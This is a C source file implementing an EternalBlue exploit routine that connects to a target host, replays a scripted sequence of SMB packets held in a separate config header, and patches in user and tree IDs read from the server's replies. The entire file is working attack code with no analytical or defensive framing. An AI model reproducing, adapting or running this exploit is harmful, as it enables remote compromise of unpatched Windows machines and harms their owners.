#define _GNU_SOURCE
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "config.h"

static int eb_connect(const char *ip, int port)
{
    int fd;
    struct sockaddr_in addr;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        return -1;
    memset(&addr, 0, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);
    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        close(fd);
        return -1;
    }
    if (connect(fd, (struct sockaddr *)&addr, sizeof addr) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static int eb_send_all(int fd, const void *buffer, size_t length)
{
    const unsigned char *p = buffer;

    while (length > 0) {
        ssize_t n = send(fd, p, length, MSG_NOSIGNAL);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }
        if (n == 0)
            return -1;
        p += (size_t)n;
        length -= (size_t)n;
    }
    return 0;
}

static size_t eb_patch(const uint8_t *in, size_t in_len, unsigned char *out,
                       size_t out_cap, const unsigned char uid[2],
                       const unsigned char tid[2])
{
    static const char U[] = "__USERID__PLACEHOLDER__";
    static const char T[] = "__TREEID__PLACEHOLDER__";
    const size_t ul = sizeof U - 1;
    const size_t tl = sizeof T - 1;
    size_t i = 0;
    size_t o = 0;

    while (i < in_len) {
        if (i + ul <= in_len && memcmp(in + i, U, ul) == 0) {
            if (o + 2 > out_cap)
                return 0;
            out[o++] = uid[0];
            out[o++] = uid[1];
            i += ul;
        } else if (i + tl <= in_len && memcmp(in + i, T, tl) == 0) {
            if (o + 2 > out_cap)
                return 0;
            out[o++] = tid[0];
            out[o++] = tid[1];
            i += tl;
        } else {
            if (o + 1 > out_cap)
                return 0;
            out[o++] = in[i++];
        }
    }
    return o;
}

int EternalBlue(const char *ip, int port)
{
    int socks[NUM_SOCKETS + 1];
    unsigned char uid[2] = {0, 0};
    unsigned char tid[2] = {0, 0};
    size_t k;
    int i;

    signal(SIGPIPE, SIG_IGN);
    for (i = 0; i <= NUM_SOCKETS; i++)
        socks[i] = -1;

    for (k = 0; k < EB_OPS_COUNT; k++) {
        const eb_op_t *op = &EB_OPS[k];

        if (op->stream > NUM_SOCKETS)
            continue;

        if (op->kind == 0) {
            socks[op->stream] = eb_connect(ip, port);
            if (socks[op->stream] < 0) {
                printf("EternalBlue: connect failed on stream %u\n", op->stream);
                return -1;
            }
        } else if (op->kind == 1) {
            const uint8_t *pkt = EB_PACKETS + op->offset;
            size_t len = op->length;
            unsigned char *buf = malloc(len == 0 ? 1 : len);
            size_t out_len;

            if (buf == NULL)
                return -1;
            out_len = eb_patch(pkt, len, buf, len, uid, tid);
            if (out_len == 0 && len != 0) {
                free(buf);
                return -1;
            }
            if (socks[op->stream] < 0) {
                free(buf);
                return -1;
            }
            if (eb_send_all(socks[op->stream], buf, out_len) < 0) {
                free(buf);
                return -1;
            }
            free(buf);
        } else if (op->kind == 2) {
            unsigned char resp[4096];
            ssize_t n;

            if (socks[op->stream] < 0)
                continue;
            do {
                n = recv(socks[op->stream], resp, sizeof resp, 0);
            } while (n < 0 && errno == EINTR);

            if (n >= 34 && op->fix == 1) {
                uid[0] = resp[32];
                uid[1] = resp[33];
            }
            if (n >= 30 && op->fix == 2) {
                tid[0] = resp[28];
                tid[1] = resp[29];
            }
        } else if (op->kind == 3) {
            if (socks[op->stream] >= 0) {
                close(socks[op->stream]);
                socks[op->stream] = -1;
            }
        }
    }

    for (i = 0; i <= NUM_SOCKETS; i++)
        if (socks[i] >= 0)
            close(socks[i]);

    printf("EternalBlue: replay complete\n");
    return 0;
}
